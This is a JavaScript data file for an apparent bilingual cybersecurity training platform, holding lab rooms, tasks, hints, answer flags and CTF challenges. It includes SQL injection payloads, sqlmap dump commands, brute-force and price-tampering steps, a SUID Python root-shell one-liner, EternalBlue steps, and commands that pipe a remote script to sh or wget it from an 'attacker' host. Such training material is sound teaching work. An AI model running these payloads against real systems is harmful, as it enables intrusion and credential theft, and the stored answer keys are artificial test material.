/* ============================================================
   SHADOWHACK ROOMS DATA - Frontend Data for Rooms and Paths
   Matches the seed_data.json structure for frontend rendering
   ============================================================ */

// Learning Paths with Career Indicators (renamed to avoid conflict with learning-paths-data.js)
window.roomsPathsData = {
    paths: [
        {
            id: 'pre-security',
            name: 'Pre-Security Path',
            nameAr: 'المبتدئ الكامل',
            description: 'Foundation path for complete beginners. Break the fear of the black screen.',
            descriptionAr: 'مسار تأسيسي لأي شخص لا يعرف شيئاً عن الأنظمة. الهدف: كسر حاجز الخوف من الشاشة السوداء.',
            icon: '🛡️',
            color: '#22c55e',
            difficulty: 'beginner',
            estimatedHours: 20,
            totalRooms: 2,
            totalPoints: 550,
            career: {
                title: 'IT Support Specialist',
                titleAr: 'أخصائي دعم تقني',
                readinessPercent: 30,
                avgSalary: '$45,000'
            },
            rooms: ['linux-fundamentals', 'networking-101']
        },
        {
            id: 'web-hacking',
            name: 'Web Hacking Path',
            nameAr: 'مخترق الويب',
            description: 'Deep focus on OWASP Top 10. The most detailed and powerful path.',
            descriptionAr: 'التركيز العميق على OWASP Top 10. هذا المسار يجب أن يكون الأقوى والأكثر تفصيلاً.',
            icon: '💀',
            color: '#ef4444',
            difficulty: 'intermediate',
            estimatedHours: 60,
            totalRooms: 3,
            totalPoints: 1550,
            career: {
                title: 'Junior Penetration Tester',
                titleAr: 'مختبر اختراق مبتدئ',
                readinessPercent: 60,
                avgSalary: '$60,000'
            },
            rooms: ['sql-injection-bakery', 'burp-suite-blackbox', 'privilege-escalation']
        }
    ]
};

// Rooms Data with Full Task Details
window.roomsData = {
    'linux-fundamentals': {
        id: 'linux-fundamentals',
        pathId: 'pre-security',
        title: 'Linux Fundamentals',
        titleAr: 'أساسيات لينكس',
        scenario: 'You are a new employee at a server company. Your manager asked you to access the server for the first time and check the files.',
        scenarioAr: 'أنت موظف جديد في شركة خوادم، ومديرك طلب منك الدخول للسيرفر لأول مرة وتفقد الملفات.',
        difficulty: 'easy',
        points: 300,
        estimatedMinutes: 45,
        machineType: 'terminal',
        machineIP: '10.10.10.10',
        tasks: [
            {
                id: 'task-1',
                title: 'Where Am I?',
                titleAr: 'أين أنا؟',
                description: 'Learn the basic navigation commands: pwd, ls, cd',
                descriptionAr: 'شرح أوامر pwd, ls, cd',
                content: `## Navigation Commands

### pwd (Print Working Directory)
Shows your current location in the filesystem.
\`\`\`bash
$ pwd
/home/user
\`\`\`

### ls (List)
Lists files and directories.
\`\`\`bash
$ ls
Documents  Downloads  welcome.txt
\`\`\`

### cd (Change Directory)
Moves to another directory.
\`\`\`bash
$ cd Documents
$ pwd
/home/user/Documents
\`\`\``,
                question: 'What is the name of the file in the home directory?',
                questionAr: 'ما هو اسم الملف الموجود في مجلد الـ home؟',
                answerType: 'text',
                answer: 'welcome.txt',
                points: 50,
                hints: [
                    { text: 'Use the ls command to list files', textAr: 'استخدم أمر ls لعرض الملفات', cost: 5 },
                    { text: 'Navigate to /home/user first', textAr: 'انتقل إلى /home/user أولاً', cost: 5 }
                ]
            },
            {
                id: 'task-2',
                title: 'Reading Files',
                titleAr: 'قراءة الملفات',
                description: 'Learn cat, head, grep commands',
                descriptionAr: 'شرح cat, head, grep',
                content: `## File Reading Commands

### cat
Displays entire file content.
\`\`\`bash
$ cat welcome.txt
Welcome to Linux!
\`\`\`

### head
Shows first 10 lines.
\`\`\`bash
$ head logs.txt
\`\`\`

### grep
Search for patterns in files.
\`\`\`bash
$ grep "password" logs.txt
[ERROR] password reset failed for user admin
\`\`\``,
                question: 'Search inside logs.txt for the word "password". What is the hidden secret in the log?',
                questionAr: 'ابحث داخل ملف logs.txt عن كلمة password. ما هي الكلمة السرية المخفية في اللوج؟',
                answerType: 'flag',
                answer: 'FLAG{Grep_Master_101}',
                points: 100,
                hints: [
                    { text: 'Use grep command with the keyword', textAr: 'استخدم أمر grep مع الكلمة المفتاحية', cost: 5 },
                    { text: 'grep password logs.txt', textAr: 'grep password logs.txt', cost: 10 }
                ]
            },
            {
                id: 'task-3',
                title: 'The Killer Permissions',
                titleAr: 'الصلاحيات القاتلة',
                description: 'Learn chmod, chown, sudo commands',
                descriptionAr: 'شرح chmod, chown, sudo',
                content: `## Permission Commands

### chmod
Change file permissions.
\`\`\`bash
$ chmod 755 script.sh
\`\`\`

### chown
Change file ownership.
\`\`\`bash
$ sudo chown root:root file.txt
\`\`\`

### sudo
Run commands as superuser.
\`\`\`bash
$ sudo cat /root/secret.txt
\`\`\`

## Task
Try to read /root/secret.txt (it will fail). Now use sudo.`,
                question: 'Read /root/secret.txt using sudo. What is the flag?',
                questionAr: 'حاول قراءة ملف /root/secret.txt. (سيفشل). الآن استخدم sudo.',
                answerType: 'flag',
                answer: 'FLAG{Sudo_Power_Unleashed}',
                points: 150,
                hints: [
                    { text: 'You need elevated privileges', textAr: 'تحتاج صلاحيات مرتفعة', cost: 5 },
                    { text: 'sudo cat /root/secret.txt', textAr: 'sudo cat /root/secret.txt', cost: 10 }
                ]
            }
        ]
    },

    'networking-101': {
        id: 'networking-101',
        pathId: 'pre-security',
        title: 'Networking 101',
        titleAr: 'كيف تعمل الشبكات؟',
        scenario: 'The internet stopped working at the company. You need to use diagnostic tools to find the cause.',
        scenarioAr: 'توقف الإنترنت في الشركة، وعليك استخدام أدوات التشخيص لمعرفة السبب.',
        difficulty: 'easy',
        points: 250,
        estimatedMinutes: 40,
        machineType: 'terminal',
        machineIP: '10.10.10.11',
        tools: ['ping', 'traceroute', 'telnet'],
        tasks: [
            {
                id: 'task-1',
                title: 'Is the Server Alive?',
                titleAr: 'هل السيرفر حي؟',
                description: 'Learn ICMP principle and Ping',
                descriptionAr: 'مبدأ ICMP والـ Ping',
                content: `## ICMP & Ping

ICMP (Internet Control Message Protocol) is used to send error messages and operational information.

### Ping
\`\`\`bash
$ ping 10.10.10.5
PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
64 bytes from 10.10.10.5: icmp_seq=1 ttl=64 time=0.5 ms
\`\`\`

If you receive replies, the server is alive!`,
                question: 'Ping the address 10.10.10.5. Does it work? (yes/no)',
                questionAr: 'قم بعمل Ping للعنوان 10.10.10.5، هل يعمل؟',
                answerType: 'text',
                answer: 'yes',
                points: 50,
                hints: [
                    { text: 'ping 10.10.10.5', textAr: 'ping 10.10.10.5', cost: 5 }
                ]
            },
            {
                id: 'task-2',
                title: 'The Magic OSI Model',
                titleAr: 'النموذج السحري OSI Model',
                description: 'Learn the 7 layers simply',
                descriptionAr: 'شرح الطبقات السبع ببساطة',
                content: `## OSI Model Layers

| Layer | Name | Example |
|-------|------|--------|
| 7 | Application | HTTP, FTP, DNS |
| 6 | Presentation | SSL, TLS |
| 5 | Session | NetBIOS |
| 4 | Transport | TCP, UDP |
| 3 | Network | IP, ICMP |
| 2 | Data Link | Ethernet, MAC |
| 1 | Physical | Cables, Hubs |`,
                question: 'At which layer does the HTTP protocol work?',
                questionAr: 'في أي طبقة يعمل بروتوكول HTTP؟',
                answerType: 'number',
                answer: '7',
                points: 50,
                hints: [
                    { text: 'HTTP is an Application layer protocol', textAr: 'HTTP هو بروتوكول طبقة التطبيق', cost: 5 }
                ]
            }
        ]
    },

    'sql-injection-bakery': {
        id: 'sql-injection-bakery',
        pathId: 'web-hacking',
        title: 'SQL Injection Bakery',
        titleAr: 'مخبز الحقن',
        scenario: 'A local bakery got hacked. The owner asks you to test the product search code.',
        scenarioAr: 'متجر حلويات محلي تعرض للاختراق. المالك يطلب منك فحص كود البحث عن المنتجات.',
        difficulty: 'easy',
        points: 500,
        estimatedMinutes: 60,
        machineType: 'web',
        machineIP: '10.10.10.20',
        webUrl: 'http://10.10.10.20',
        tasks: [
            {
                id: 'task-1',
                title: 'Breaking Logic (Authentication Bypass)',
                titleAr: 'كسر المنطق',
                description: 'Learn how OR 1=1 works',
                descriptionAr: 'كيف يعمل OR 1=1',
                content: `## SQL Injection - Authentication Bypass

When an application builds SQL queries by concatenating user input:
\`\`\`sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
\`\`\`

We can inject:
\`\`\`
Username: admin' OR 1=1--
Password: anything
\`\`\`

Resulting query:
\`\`\`sql
SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'
\`\`\`

The \`--\` comments out the rest, and \`1=1\` is always true!`,
                question: 'Login as Admin without knowing the password. What flag appears?',
                questionAr: 'سجل الدخول كـ Admin دون معرفة الباسورد. ما هو الفلاق؟',
                answerType: 'flag',
                answer: 'FLAG{Login_Bypassed_Succesfully}',
                payload: "' OR 1=1--",
                points: 150,
                hints: [
                    { text: 'Try using \' OR 1=1', textAr: 'جرب استخدام \' OR 1=1', cost: 5 },
                    { text: 'Check the login form source code', textAr: 'افحص كود فورم تسجيل الدخول', cost: 5 },
                    { text: "Full payload: ' OR 1=1--", textAr: "البايلود الكامل: ' OR 1=1--", cost: 10 }
                ]
            },
            {
                id: 'task-2',
                title: 'Stealing the Menu (UNION Based)',
                titleAr: 'سرقة القائمة',
                description: 'Merge tables using UNION SELECT',
                descriptionAr: 'دمج الجداول بـ UNION SELECT',
                content: `## UNION Based SQL Injection

UNION allows combining results from multiple queries:
\`\`\`sql
SELECT name, price FROM products WHERE id=1
UNION
SELECT username, password FROM users
\`\`\`

### Steps:
1. Find number of columns
2. Find column data types
3. Extract data

\`\`\`
1' UNION SELECT username,password FROM users--
\`\`\``,
                question: 'Extract usernames and passwords from the users table. What is the flag?',
                questionAr: 'استخرج أسماء المستخدمين والباسوردات من جدول users.',
                answerType: 'flag',
                answer: 'FLAG{Database_Dumped_3306}',
                points: 200,
                hints: [
                    { text: 'Find the number of columns first', textAr: 'ابحث عن عدد الأعمدة أولاً', cost: 5 },
                    { text: 'Use ORDER BY to find columns', textAr: 'استخدم ORDER BY لإيجاد الأعمدة', cost: 5 }
                ]
            },
            {
                id: 'task-3',
                title: 'Automation (SQLMap)',
                titleAr: 'الأتمتة',
                description: 'Using sqlmap tool',
                descriptionAr: 'استخدام أداة sqlmap',
                content: `## SQLMap - Automatic SQL Injection

SQLMap automates the detection and exploitation of SQL injection flaws.

\`\`\`bash
# Basic usage
sqlmap -u "http://target.com/search?id=1" --dbs

# Dump specific database
sqlmap -u "http://target.com/search?id=1" -D bakery --tables

# Dump table contents
sqlmap -u "http://target.com/search?id=1" -D bakery -T users --dump
\`\`\`

### Options:
- \`--dbs\`: List databases
- \`--tables\`: List tables
- \`--dump\`: Extract data
- \`--batch\`: Run without user input`,
                question: 'Use sqlmap to extract data automatically. Enter "completed" when done.',
                questionAr: 'استخدم الأداة لاستخراج الداتا تلقائياً.',
                answerType: 'text',
                answer: 'completed',
                points: 150,
                hints: [
                    { text: "sqlmap -u 'URL' --dbs", textAr: "sqlmap -u 'URL' --dbs", cost: 5 }
                ]
            }
        ]
    },

    'burp-suite-blackbox': {
        id: 'burp-suite-blackbox',
        pathId: 'web-hacking',
        title: 'Burp Suite: The Black Box',
        titleAr: 'Burp Suite: الصندوق الأسود',
        scenario: 'No hacker can live without this tool. Learn how to intercept and modify requests.',
        scenarioAr: 'لا غنى لأي هكر عن هذه الأداة. تعلم كيف تعترض الطلبات وتعدلها.',
        difficulty: 'medium',
        points: 450,
        estimatedMinutes: 50,
        machineType: 'web',
        machineIP: '10.10.10.21',
        webUrl: 'http://10.10.10.21',
        tasks: [
            {
                id: 'task-1',
                title: 'Setup',
                titleAr: 'الإعداد',
                description: 'Connect browser to proxy (FoxyProxy)',
                descriptionAr: 'كيفية ربط المتصفح بالبروكسي (FoxyProxy)',
                content: `## Burp Suite Setup

### Step 1: Configure Proxy
1. Open Burp Suite
2. Go to Proxy > Options
3. Ensure listener is on 127.0.0.1:8080

### Step 2: Configure Browser
1. Install FoxyProxy extension
2. Add new proxy: 127.0.0.1:8080
3. Enable the proxy

### Step 3: Import CA Certificate
1. Visit http://burp in browser
2. Download CA Certificate
3. Install in browser's certificate store`,
                question: 'Configure Burp Suite and browser. Enter "ready" when done.',
                questionAr: 'قم بإعداد Burp Suite والمتصفح. أدخل "ready" عند الانتهاء.',
                answerType: 'text',
                answer: 'ready',
                points: 50,
                hints: []
            },
            {
                id: 'task-2',
                title: 'Repeater',
                titleAr: 'التكرار',
                description: 'Send the same request multiple times with small changes',
                descriptionAr: 'إرسال نفس الطلب عدة مرات مع تغيير بسيط',
                content: `## Burp Repeater

Repeater allows you to manually modify and resend requests.

### Workflow:
1. Intercept request in Proxy
2. Right-click > Send to Repeater
3. Modify the request
4. Click Send
5. Analyze the response

### Task:
Intercept a purchase request and change the product price from $100 to $1.`,
                question: 'Intercept the purchase request and change the price from 100$ to 1$. What flag appears?',
                questionAr: 'اعترض طلب الشراء، وغير سعر المنتج من 100$ إلى 1$.',
                answerType: 'flag',
                answer: 'FLAG{Price_Manipulation_Is_Fun}',
                points: 200,
                hints: [
                    { text: 'Look for price parameter in POST data', textAr: 'ابحث عن معامل السعر في بيانات POST', cost: 5 },
                    { text: 'Change price=100 to price=1', textAr: 'غير price=100 إلى price=1', cost: 10 }
                ]
            },
            {
                id: 'task-3',
                title: 'Brute Force (Intruder)',
                titleAr: 'القوة الغاشمة',
                description: 'Try 1000 passwords per minute',
                descriptionAr: 'تجربة 1000 باسورد في الدقيقة',
                content: `## Burp Intruder

Intruder automates customized attacks.

### Attack Types:
- **Sniper**: Single payload set
- **Battering Ram**: Same payload all positions
- **Pitchfork**: Multiple payload sets in sync
- **Cluster Bomb**: All combinations

### Workflow:
1. Send request to Intruder
2. Mark payload positions with §
3. Configure payload list (rockyou.txt)
4. Start attack
5. Analyze responses by length/status`,
                question: 'Crack the admin password using a mini rockyou.txt list. Enter the password.',
                questionAr: 'كسر باسورد حساب admin باستخدام قائمة rockyou.txt مصغرة.',
                answerType: 'text',
                answer: 'sunshine',
                points: 200,
                hints: [
                    { text: 'Use Sniper attack type', textAr: 'استخدم نوع هجوم Sniper', cost: 5 },
                    { text: 'Look for different response length', textAr: 'ابحث عن اختلاف في طول الاستجابة', cost: 10 }
                ]
            }
        ]
    },

    'privilege-escalation': {
        id: 'privilege-escalation',
        pathId: 'web-hacking',
        title: 'Admin Privileges',
        titleAr: 'امتيازات المدير',
        scenario: 'You hacked the server and entered as a regular user. Your mission now is to become Root.',
        scenarioAr: 'لقد اخترقت السيرفر ودخلت كمستخدم عادي (User). مهمتك الآن أن تصبح (Root).',
        difficulty: 'medium',
        points: 600,
        estimatedMinutes: 75,
        machineType: 'terminal',
        machineIP: '10.10.10.30',
        tasks: [
            {
                id: 'task-1',
                title: 'Enumeration',
                titleAr: 'التعداد',
                description: 'Using LinPEAS script',
                descriptionAr: 'استخدام سكربت LinPEAS',
                content: `## Linux Privilege Escalation - Enumeration

### LinPEAS
LinPEAS is a script that searches for possible privilege escalation paths.

\`\`\`bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or from local
wget http://attacker/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
\`\`\`

### Manual Checks:
\`\`\`bash
# SUID files
find / -perm -4000 2>/dev/null

# Writable files
find / -writable 2>/dev/null

# Sudo permissions
sudo -l
\`\`\``,
                question: 'What file has abnormal SUID permissions?',
                questionAr: 'ما هو الملف الذي يملك صلاحيات SUID غير طبيعية؟',
                answerType: 'text',
                answer: '/usr/bin/python3',
                points: 200,
                hints: [
                    { text: 'Use find command with -perm -4000', textAr: 'استخدم أمر find مع -perm -4000', cost: 5 },
                    { text: 'find / -perm -4000 2>/dev/null', textAr: 'find / -perm -4000 2>/dev/null', cost: 10 }
                ]
            },
            {
                id: 'task-2',
                title: 'Exploiting GTFOBins',
                titleAr: 'استغلال GTFOBins',
                description: 'Use Python to open Root shell',
                descriptionAr: 'كيفية استخدام Python لفتح Shell بصلاحيات Root',
                content: `## GTFOBins

GTFOBins is a curated list of Unix binaries that can be exploited.

### Python SUID Exploitation
When Python has SUID bit set:

\`\`\`bash
# Check GTFOBins for python
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
\`\`\`

The \`-p\` flag preserves the effective user ID (root).

### Verification
\`\`\`bash
whoami
# should output: root
id
# should show uid=0(root)
\`\`\``,
                question: 'Execute the command to get Root. What is the flag in /root/flag.txt?',
                questionAr: 'نفذ الأمر للحصول على Root. ما هو الفلاق؟',
                answerType: 'flag',
                answer: 'FLAG{Root_Access_Granted_King}',
                points: 400,
                hints: [
                    { text: 'Use python3 with os.execl', textAr: 'استخدم python3 مع os.execl', cost: 5 },
                    { text: 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', textAr: 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'', cost: 15 }
                ]
            }
        ]
    }
};

// CTF Challenges Data
window.ctfChallengesData = [
    {
        id: 'mr-robot',
        title: 'Mr. Robot',
        titleAr: 'السيد روبوت',
        description: 'Machine inspired by the TV show. Find the three keys.',
        descriptionAr: 'ماكينة مستوحاة من المسلسل. ابحث عن المفاتيح الثلاثة.',
        difficulty: 'easy',
        points: 800,
        category: 'box',
        machineIP: '10.10.10.100',
        expectedSteps: [
            'Scan the website and discover robots.txt',
            'Download the hidden dictionary file',
            'Crack the WordPress admin password',
            'Exploit a WordPress vulnerability to get shell',
            'Find user.txt and root.txt'
        ],
        expectedStepsAr: [
            'فحص الموقع واكتشاف robots.txt',
            'تحميل ملف القاموس المخفي',
            'كسر باسورد لوحة Wordpress',
            'استغلال ثغرة في Wordpress للحصول على Shell',
            'إيجاد user.txt و root.txt'
        ],
        hints: [
            { text: 'Check robots.txt first', textAr: 'افحص robots.txt أولاً', cost: 10 },
            { text: 'WordPress version is vulnerable', textAr: 'نسخة Wordpress بها ثغرات', cost: 15 },
            { text: 'Look for SUID binaries for root', textAr: 'ابحث عن ملفات SUID للـ root', cost: 20 }
        ]
    },
    {
        id: 'eternal-blue',
        title: 'Eternal Blue',
        titleAr: 'الأزرق الأبدي',
        description: 'An old Windows 7 that wasn\'t updated. Classic SMB vulnerability.',
        descriptionAr: 'ويندوز 7 قديم لم يتم تحديثه. كلاسيكي جداً.',
        difficulty: 'medium',
        points: 1000,
        category: 'box',
        machineIP: '10.10.10.101',
        objective: 'Learn Metasploit and SMB exploitation',
        objectiveAr: 'تعلم استخدام Metasploit وثغرة SMB',
        expectedSteps: [
            'Fuzzing with Nmap to discover open port 445',
            'Use msfconsole',
            'Execute exploit/windows/smb/ms17_010_eternalblue',
            'You are now NT AUTHORITY\\SYSTEM'
        ],
        expectedStepsAr: [
            'Fuzzing بـ Nmap لاكتشاف بورت 445 مفتوح',
            'استخدام msfconsole',
            'تنفيذ exploit/windows/smb/ms17_010_eternalblue',
            'أنت الآن NT AUTHORITY\\SYSTEM'
        ],
        hints: [
            { text: 'nmap -sV -p 445 TARGET', textAr: 'nmap -sV -p 445 TARGET', cost: 10 },
            { text: 'search ms17_010 in msfconsole', textAr: 'ابحث عن ms17_010 في msfconsole', cost: 15 },
            { text: 'Set RHOSTS and LHOST correctly', textAr: 'اضبط RHOSTS و LHOST بشكل صحيح', cost: 20 }
        ]
    }
];

// Career Indicators for path completion
window.careerIndicators = {
    'pre-security': {
        title: 'IT Support Specialist',
        titleAr: 'أخصائي دعم تقني',
        readiness: 30,
        avgSalary: '$45,000',
        message: 'You are now 30% qualified for an IT Support Specialist position with an average salary of $45,000/year',
        messageAr: 'أنت الآن مؤهل بنسبة 30% لوظيفة أخصائي دعم تقني بمتوسط راتب $45,000 سنوياً'
    },
    'web-hacking': {
        title: 'Junior Penetration Tester',
        titleAr: 'مختبر اختراق مبتدئ',
        readiness: 60,
        avgSalary: '$60,000',
        message: 'You are now 60% qualified for a Junior Penetration Tester position with an average salary of $60,000/year',
        messageAr: 'أنت الآن مؤهل بنسبة 60% لوظيفة مختبر اختراق مبتدئ بمتوسط راتب $60,000 سنوياً'
    }
};

// Helper function to get room by ID
function getRoomById(roomId) {
    return roomsData[roomId] || null;
}

// Helper function to get path by ID
function getPathById(pathId) {
    return roomsPathsData.paths.find(p => p.id === pathId) || null;
}

// Helper function to show career indicator
function showCareerIndicator(pathId) {
    const indicator = careerIndicators[pathId];
    if (!indicator) return;

    const isArabic = document.documentElement.lang === 'ar';
    const message = isArabic ? indicator.messageAr : indicator.message;

    // Create celebration modal
    const modal = document.createElement('div');
    modal.className = 'career-celebration-modal';
    modal.innerHTML = `
    <div class="career-modal-content">
      <div class="career-icon">🎉🏆🎉</div>
      <h2>Congratulations!</h2>
      <div class="career-title">${isArabic ? indicator.titleAr : indicator.title}</div>
      <div class="career-readiness">
        <div class="readiness-bar" style="width: ${indicator.readiness}%"></div>
        <span>${indicator.readiness}%</span>
      </div>
      <p class="career-message">${message}</p>
      <div class="career-salary">
        <i class="fas fa-dollar-sign"></i>
        <span>${indicator.avgSalary}/year</span>
      </div>
      <button onclick="this.closest('.career-celebration-modal').remove()">
        ${isArabic ? 'استمر' : 'Continue'}
      </button>
    </div>
  `;

    document.body.appendChild(modal);
}

// Export for use
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { roomsPathsData, roomsData, ctfChallengesData, careerIndicators };
}
